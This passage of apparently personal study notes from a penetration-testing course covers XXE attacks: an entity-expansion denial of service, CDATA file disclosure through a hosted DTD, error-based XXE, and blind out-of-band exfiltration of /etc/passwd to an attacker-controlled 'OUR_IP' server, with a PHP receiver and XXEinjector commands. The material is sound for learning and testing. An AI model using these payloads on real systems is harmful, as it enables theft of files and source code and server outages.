  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. However, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`.


# Advanced File Disclosure

Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.


## Advanced Exfiltration with CDATA

We can utilize another method to extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). The XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, **this will not work**, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:
``` bash
> echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
> python3 -m http.server 8000
```

Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Once we write our `xxe.dtd` file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the `submitDetails.php` file:
![[Pasted image 20230602130636.jpg]]

>**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks.


## Error Based XXE

Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be `blind` to the XML output and so would not be able to retrieve the file content using our usual methods.

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.

Let's consider the exercise we have in `/error` at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity, as follows: ![[Pasted image 20230602130836.jpg]]

We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Now, we can call our external DTD script, and then reference the `error` entity, as follows:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts` file as follows:
![[Pasted image 20230602130958.jpg]]

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.


# Blind Data Exfiltration

In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

## Out-of-band Data Exfiltration

If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE.

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:
``` bash
> vi index.php # here we write the above PHP code
> php -S 0.0.0.0:8000
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Then, we can send our request to the web application:
![[Pasted image 20230602143641.jpg]]

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content.

>**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.


## Automated OOB Exfiltration

In many cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
``` bash
ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
``` bash
cat Logs/10.129.201.94/etc/passwd.log 
```
